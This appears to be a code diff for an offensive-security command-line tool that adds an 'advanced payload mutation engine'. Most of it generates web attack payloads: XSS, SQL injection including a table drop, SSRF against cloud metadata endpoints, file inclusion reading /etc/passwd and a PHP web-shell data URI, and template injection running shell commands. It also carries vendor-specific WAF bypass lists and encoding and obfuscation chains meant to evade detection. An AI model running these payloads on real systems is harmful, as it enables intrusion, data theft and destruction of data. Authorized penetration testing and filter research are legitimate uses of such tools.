+                        click.secho(f"    Effectiveness: {effectiveness:.2f} | Evasion: {evasion} | Steganography: {steganography_level}", fg="cyan")
+                        
+                        if mutation_data['encoding_applied']:
+                            click.secho(f"    Encodings: {', '.join(mutation_data['encoding_applied'])}", fg="blue")
+                        
+                        if mutation_data['bypass_techniques']:
+                            click.secho(f"    Bypasses: {', '.join(mutation_data['bypass_techniques'])}", fg="magenta")
+                
+                # Add advanced mutations to payload data
+                payload_data["advanced_mutations"] = {
+                    "count": len(mutations_data),
+                    "technique": payload,
+                    "context": context or "html",
+                    "waf_profile": waf_profile,
+                    "encoding_chains": encoding_chains,
+                    "steganography_enabled": steganography,
+                    "variants": mutations_data
+                }
+                
+            else:
+                # Use legacy mutator for backward compatibility
+                mutator = PayloadMutator(context=context or "html", technique=payload)
+                mutations_list = mutator.mutate()
 
-            # Limit mutations if requested
-            if mutations < len(mutations_list):
-                mutations_list = mutations_list[:mutations]
+                # Limit mutations if requested
+                if mutations < len(mutations_list):
+                    mutations_list = mutations_list[:mutations]
 
-            click.secho(
-                f"Generated {len(mutations_list)} mutation variants:", fg="yellow"
-            )
-            for i, mutation in enumerate(mutations_list, 1):
-                click.secho(f"{i:2d}. {mutation}", fg="white")
+                click.secho(
+                    f"Generated {len(mutations_list)} mutation variants:", fg="yellow"
+                )
+                for i, mutation in enumerate(mutations_list, 1):
+                    click.secho(f"{i:2d}. {mutation}", fg="white")
 
-            # Add mutations to payload data
-            payload_data["mutations"] = {
-                "count": len(mutations_list),
-                "technique": payload,
-                "context": context or "html",
-                "variants": mutations_list,
-            }
+                # Add mutations to payload data
+                payload_data["mutations"] = {
+                    "count": len(mutations_list),
+                    "technique": payload,
+                    "context": context or "html",
+                    "variants": mutations_list,
+                }
 
         click.secho(f"\n{payload_data['payloads']}", fg="white")
 
@@ -2726,20 +3514,415 @@ Available commands:
 # === Payload Mutation Engine ===
 
 
+class AdvancedPayloadMutator:
+    """Enhanced payload mutation engine with WAF bypass and advanced encoding"""
+    
+    def __init__(self, context="html", technique="xss", waf_profile="auto", encoding_chains=2):
+        self.context = context.lower()
+        self.technique = technique.lower()
+        self.waf_profile = waf_profile.lower()
+        self.encoding_chains = encoding_chains
+        
+        # Encoding functions
+        self.encoders = {
+            'url': urllib.parse.quote,
+            'double_url': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
+            'html': lambda x: x.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;'),
+            'base64': lambda x: base64.b64encode(x.encode()).decode(),
+            'hex': lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
+            'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
+            'mixed_case': lambda x: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(x))
+        }
+        
+        # WAF-specific bypass patterns
+        self.waf_bypass_patterns = self._load_waf_patterns()
+        
+        # Obfuscation techniques
+        self.obfuscation_techniques = [
+            'comment_insertion',
+            'whitespace_variation',
+            'case_alternation',
+            'encoding_mix',
+            'parameter_pollution',
+            'protocol_smuggling'
+        ]
+    
+    def _load_waf_patterns(self) -> Dict[str, List[str]]:
+        """Load WAF-specific bypass patterns"""
+        return {
+            'cloudflare': [
+                'union/**/select',
+                'uni%6fn sel%65ct',
+                'UNION/*!32302*/SELECT',
+                '<SCR%00IPT>alert(1)</SCR%00IPT>',
+                '<img src=x onerror="alert`1`">',
+                'javascript:/**/alert(1)'
+            ],
+            'aws': [
+                'union%0aselect',
+                'union%0dselect', 
+                '/*!union*//*!select*/',
+                '<script>alert(/xss/)</script>',
+                '<svg/onload=alert(1)>',
+                'file:///etc/passwd'
+            ],
+            'azure': [
+                'union%23%0aselect',
+                '/**/union/**/select/**/',
+                '<iframe src="javascript:alert(1)">',
+                '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
+                'http://169.254.169.254/metadata/instance'
+            ],
+            'akamai': [
+                'union%2bselect',
+                'union%20/*!select*/',
+                '<script>alert(document.domain)</script>',
+                '<details open ontoggle=alert(1)>',
+                'gopher://127.0.0.1:80/_'
+            ]
+        }
+    
+    def mutate(self, count: int = 10) -> List[Dict[str, Any]]:
+        """Generate advanced payload mutations with metadata"""
+        mutations = []
+        
+        if self.technique == "xss":
+            base_payloads = self._get_xss_payloads()
+        elif self.technique == "sqli":
+            base_payloads = self._get_sqli_payloads()
+        elif self.technique == "ssrf":
+            base_payloads = self._get_ssrf_payloads()
+        elif self.technique == "lfi":
+            base_payloads = self._get_lfi_payloads()
+        elif self.technique == "ssti":
+            base_payloads = self._get_ssti_payloads()
+        else:
+            base_payloads = ["test_payload"]
+        
+        for i, base_payload in enumerate(base_payloads[:count]):
+            # Apply encoding chains
+            encoded_variants = self._apply_encoding_chains(base_payload)
+            
+            # Apply WAF-specific bypasses
+            waf_variants = self._apply_waf_bypasses(base_payload)
+            
+            # Apply obfuscation techniques
+            obfuscated_variants = self._apply_obfuscation(base_payload)
+            
+            # Combine all variants
+            all_variants = [base_payload] + encoded_variants + waf_variants + obfuscated_variants
+            
+            for variant in all_variants[:count]:
+                mutation_data = {
+                    'payload': variant,
+                    'original': base_payload,
+                    'technique': self.technique,
+                    'context': self.context,
+                    'waf_profile': self.waf_profile,
+                    'encoding_applied': self._detect_encoding(variant, base_payload),
+                    'bypass_techniques': self._detect_bypass_techniques(variant),
+                    'effectiveness_score': self._calculate_effectiveness_score(variant),
+                    'steganography_level': self._detect_steganography(variant),
+                    'evasion_rating': self._calculate_evasion_rating(variant)
+                }
+                mutations.append(mutation_data)
+                
+                if len(mutations) >= count:
+                    break
+            
+            if len(mutations) >= count:
+                break
+        
+        return mutations[:count]
+    
+    def _get_xss_payloads(self) -> List[str]:
+        """Get XSS payload variants"""
+        base_payloads = [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "<svg onload=alert(1)>",
+            "javascript:alert(1)",
+            "<iframe src=javascript:alert(1)>",
+            "<details open ontoggle=alert(1)>",
+            "<input onfocus=alert(1) autofocus>",
+            "<select onfocus=alert(1) autofocus>",
+            "<textarea onfocus=alert(1) autofocus>",
+            "<marquee onstart=alert(1)>"
+        ]
+        
+        # Add context-specific variants
+        if self.context == "attribute":
+            base_payloads.extend([
+                '" onload=alert(1) "',
+                "' onclick=alert(1) '",
+                '" onfocus=alert(1) autofocus="'
+            ])
+        elif self.context == "javascript":
+            base_payloads.extend([
+                "';alert(1);//",
+                "\";alert(1);//",
+                "\\';alert(1);//"
+            ])
+        
+        return base_payloads
+    
+    def _get_sqli_payloads(self) -> List[str]:
+        """Get SQL injection payload variants"""
+        return [
+            "' OR '1'='1",
+            "' OR 1=1 --",
+            "' UNION SELECT null,null,null--",
+            "'; DROP TABLE users; --",
+            "' OR SLEEP(5) --",
+            "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version()))) --",
+            "' UNION SELECT @@version,null,null --",
+            "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
+            "' UNION SELECT load_file('/etc/passwd'),null,null --",
+            "' OR EXISTS(SELECT * FROM users WHERE password='admin') --"
+        ]
+    
+    def _get_ssrf_payloads(self) -> List[str]:
+        """Get SSRF payload variants"""
+        return [
+            "http://127.0.0.1:80/",
+            "http://169.254.169.254/latest/meta-data/",
+            "file:///etc/passwd",
+            "gopher://127.0.0.1:80/_GET / HTTP/1.1",
+            "dict://127.0.0.1:11211/stat",
+            "ldap://127.0.0.1:389/",
+            "http://[::1]:80/",
+            "http://0.0.0.0:22/",
+            "http://localhost:3306/",
+            "ftp://127.0.0.1:21/"
+        ]
+    
+    def _get_lfi_payloads(self) -> List[str]:
+        """Get LFI payload variants"""
+        return [
+            "../../../etc/passwd",
+            "....//....//....//etc/passwd",
+            "..%2f..%2f..%2fetc%2fpasswd",
+            "php://filter/read=convert.base64-encode/resource=index.php",
+            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+            "expect://id",
+            "file:///etc/passwd",
+            "/var/log/apache2/access.log",
+            "C:\\windows\\system32\\drivers\\etc\\hosts",
+            "../../../../../proc/self/environ"
+        ]
+    
+    def _get_ssti_payloads(self) -> List[str]:
+        """Get SSTI payload variants"""
+        return [
+            "{{7*7}}",
+            "${7*7}",
+            "<%=7*7%>",
+            "{{config.items()}}",
+            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+            "${Class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')}",
+            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+            "{{lipsum.__globals__.os.popen('id').read()}}",
+            "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream()}",
+            "{{joiner.__init__.__globals__.os.popen('id').read()}}"
+        ]
+    
+    def _apply_encoding_chains(self, payload: str) -> List[str]:
+        """Apply multiple encoding chains"""
+        variants = []
+        
+        # Single encodings
+        for encoder_name, encoder_func in self.encoders.items():
+            try:
+                encoded = encoder_func(payload)
+                variants.append(encoded)
+            except:
+                continue
+        
+        # Double encodings
+        if self.encoding_chains >= 2:
+            for encoder1_name, encoder1 in self.encoders.items():
+                for encoder2_name, encoder2 in self.encoders.items():
+                    if encoder1_name != encoder2_name:
+                        try:
+                            double_encoded = encoder2(encoder1(payload))
+                            variants.append(double_encoded)
+                        except:
+                            continue
+        
+        return variants[:10]  # Limit to 10 variants
+    
+    def _apply_waf_bypasses(self, payload: str) -> List[str]:
+        """Apply WAF-specific bypass techniques"""
+        variants = []
+        
+        if self.waf_profile in self.waf_bypass_patterns:
+            patterns = self.waf_bypass_patterns[self.waf_profile]
+            
+            for pattern in patterns:
+                # Simple substitution-based bypass
+                if 'union' in payload.lower() and 'union' in pattern:
+                    variant = payload.lower().replace('union', pattern.split('union')[1] if 'union' in pattern else pattern)
+                    variants.append(variant)
+                elif '<script>' in payload and '<script>' in pattern:
+                    variant = payload.replace('<script>', pattern.split('<script>')[0] if '<script>' in pattern else pattern)
+                    variants.append(variant)
+        
+        # Generic WAF bypasses
+        generic_bypasses = [
+            payload.replace(' ', '/**/'),
+            payload.replace('=', '/**/=/**/'),
+            payload.replace('(', '/**/('),
+            payload.replace(')', ')/**/'),
+            payload.replace(' AND ', ' /*!AND*/ '),
+            payload.replace(' OR ', ' /*!OR*/ ')
+        ]
+        
+        variants.extend(generic_bypasses)
+        return variants[:8]  # Limit to 8 variants
+    
+    def _apply_obfuscation(self, payload: str) -> List[str]:
+        """Apply advanced obfuscation techniques"""
+        variants = []
+        
+        # Comment insertion
+        if 'script' in payload:
+            variants.append(payload.replace('script', 'scr/**/ipt'))
+        
+        # Case variation
+        variants.append(''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)))
+        
+        # Whitespace variation
+        variants.append(payload.replace(' ', '\t'))
+        variants.append(payload.replace(' ', '\n'))
+        
+        # Character substitution
+        char_subs = {
+            'a': '\\x61',
+            'e': '\\x65',
+            'i': '\\x69',
+            'o': '\\x6f',
+            'u': '\\x75'
+        }
+        
+        variant = payload
+        for char, sub in char_subs.items():
+            variant = variant.replace(char, sub)
+        variants.append(variant)
+        
+        return variants[:6]  # Limit to 6 variants
+    
+    def _detect_encoding(self, variant: str, original: str) -> List[str]:
+        """Detect which encodings were applied"""
+        applied_encodings = []
+        
+        if '%' in variant and '%' not in original:
+            applied_encodings.append('url_encoding')
+        if variant != variant.lower() and variant != variant.upper():
+            applied_encodings.append('mixed_case')
+        if '\\x' in variant:
+            applied_encodings.append('hex_encoding')
+        if '\\u' in variant:
+            applied_encodings.append('unicode_encoding')
+        
+        return applied_encodings
+    
+    def _detect_bypass_techniques(self, variant: str) -> List[str]:
+        """Detect which bypass techniques were used"""
+        techniques = []
+        
+        if '/**/' in variant:
+            techniques.append('comment_insertion')
+        if variant != variant.lower() and variant != variant.upper():
+            techniques.append('case_variation')
+        if '\t' in variant or '\n' in variant:
+            techniques.append('whitespace_manipulation')
+        if '%00' in variant:
+            techniques.append('null_byte_injection')
+        
+        return techniques
+    
+    def _calculate_effectiveness_score(self, payload: str) -> float:
+        """Calculate payload effectiveness score (0-1)"""
+        score = 0.5  # Base score
+        
+        # Complexity bonus
+        if len(payload) > 50:
+            score += 0.1
+        
+        # Encoding bonus
+        if any(enc in payload for enc in ['%', '\\x', '\\u']):
+            score += 0.2
+        
+        # WAF bypass bonus
+        if any(bypass in payload for bypass in ['/**/', '/*!', '%00']):
+            score += 0.2
+        
+        # Context-specific bonus
+        if self.context in payload or self.technique in payload:
+            score += 0.1
+        
+        return min(score, 1.0)
+    
+    def _detect_steganography(self, payload: str) -> str:
+        """Detect steganography level in payload"""
+        if any(char in payload for char in ['\\x', '\\u', '%']):
+            return "high"
+        elif any(tech in payload for tech in ['/**/', '/*!', '\t', '\n']):
+            return "medium"
+        elif payload != payload.lower() and payload != payload.upper():
+            return "low"
+        else:
+            return "none"
+    
+    def _calculate_evasion_rating(self, payload: str) -> str:
+        """Calculate evasion rating based on obfuscation techniques"""
+        evasion_points = 0
+        
+        # Encoding techniques
+        if '%' in payload:
+            evasion_points += 2
+        if '\\x' in payload or '\\u' in payload:
+            evasion_points += 3
+        
+        # Comment-based evasion
+        if '/**/' in payload or '/*!' in payload:
+            evasion_points += 2
+        
+        # Case manipulation
+        if payload != payload.lower() and payload != payload.upper():
+            evasion_points += 1
+        
+        # Whitespace manipulation
+        if '\t' in payload or '\n' in payload:
+            evasion_points += 1
+        
+        # Null bytes or special characters
+        if '%00' in payload or any(char in payload for char in ['\x00', '\x09', '\x0a']):
+            evasion_points += 3
+        
+        if evasion_points >= 8:
+            return "extreme"
+        elif evasion_points >= 5:
+            return "high"
+        elif evasion_points >= 3:
+            return "medium"
+        elif evasion_points >= 1:
+            return "low"
+        else:
+            return "basic"
+
+
+# Legacy PayloadMutator for backward compatibility
 class PayloadMutator:
     def __init__(self, context="html", technique="xss"):
         self.context = context.lower()
         self.technique = technique.lower()
+        self.advanced_mutator = AdvancedPayloadMutator(context, technique)
 
     def mutate(self):
-        if self.technique == "xss":
-            return self._mutate_xss()
-        elif self.technique == "sqli":
-            return self._mutate_sqli()
-        elif self.technique == "ssrf":
-            return self._mutate_ssrf()
-        else:
-            return []
+        """Legacy mutate method for backward compatibility"""
+        mutations = self.advanced_mutator.mutate(count=10)
+        return [m['payload'] for m in mutations]
 
     def _mutate_xss(self):
         base = "<script>alert(1)</script>"
